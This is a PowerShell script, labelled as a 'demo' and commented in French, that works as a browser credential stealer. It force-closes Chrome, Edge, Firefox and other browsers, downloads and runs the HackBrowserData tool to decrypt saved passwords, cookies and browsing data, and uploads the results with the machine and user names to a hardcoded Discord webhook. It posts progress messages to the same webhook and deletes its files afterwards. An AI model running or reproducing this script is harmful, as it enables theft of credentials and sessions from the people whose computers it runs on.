# HackBrowserData Demo - Version corrigée
$wh="https://discord.com/api/webhooks/1467465390576766998/4_TcKXgnZalThMN2QWyUY3q-H_IPWFR_Y1C2YqXnVcM-G_cxPZeTatGBSkTtCIRr_yGX"

# Notification de démarrage
irm $wh -Method Post -Body (@{content="🟢 Script started on **$env:COMPUTERNAME** by **$env:USERNAME**"}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue

# Kill browsers de manière agressive + processus enfants
$browsers = @("chrome","msedge","firefox","brave","opera","iexplore","vivaldi")
foreach ($browser in $browsers) {
    Get-Process -Name $browser -ErrorAction SilentlyContinue | Stop-Process -Force
}

# Attendre que les processus se terminent vraiment
Start-Sleep -Seconds 5

# Vérifier qu'ils sont bien fermés
foreach ($browser in $browsers) {
    $retries = 0
    while ((Get-Process -Name $browser -ErrorAction SilentlyContinue) -and ($retries -lt 10)) {
        Stop-Process -Name $browser -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 1
        $retries++
    }
}

cd $env:TEMP
Remove-Item hbd.zip,HBD,results.zip -Recurse -Force -EA 0

irm $wh -Method Post -Body (@{content="📥 Downloading HackBrowserData..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip" -OutFile hbd.zip -UseBasicParsing
    
    irm $wh -Method Post -Body (@{content="📦 Extracting..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
    
    Expand-Archive hbd.zip -DestinationPath HBD -Force
    cd HBD
    
    irm $wh -Method Post -Body (@{content="🔓 Decrypting browser data..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
    
    # Exécuter avec verbose pour déboguer
    $output = .\hack-browser-data.exe --browser all --format json --dir output --zip 2>&1
    
    Start-Sleep -Seconds 3
    
    if (Test-Path "results.zip") {
        $fileSize = (Get-Item "results.zip").Length / 1KB
        
        irm $wh -Method Post -Body (@{content="📤 Uploading data ($([math]::Round($fileSize, 2)) KB)..."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
        
        curl.exe -F "file=@results.zip" -F "content=**✅ Data from $env:COMPUTERNAME**`n**User:** $env:USERNAME`n**Size:** $([math]::Round($fileSize, 2)) KB`n**Date:** $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" $wh
        
        irm $wh -Method Post -Body (@{content="✅ Upload complete!"}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
    } else {
        # Envoyer les logs d'erreur
        $errorLog = $output | Out-String
        irm $wh -Method Post -Body (@{content="❌ ERROR: No results.zip`n``````$errorLog``````"}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
        
        # Fallback manuel
        if (Test-Path "output") {
            Compress-Archive -Path "output\*" -DestinationPath "manual.zip" -Force
            if (Test-Path "manual.zip") {
                curl.exe -F "file=@manual.zip" -F "content=**📁 Fallback data from $env:COMPUTERNAME**" $wh
            }
        }
    }
    
} catch {
    $errorMsg = $_.Exception.Message
    irm $wh -Method Post -Body (@{content="❌ EXCEPTION: $errorMsg"}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
}

cd ..
Start-Sleep -Seconds 3
Remove-Item hbd.zip,HBD -Recurse -Force -EA 0

irm $wh -Method Post -Body (@{content="🧹 Script finished."}|ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
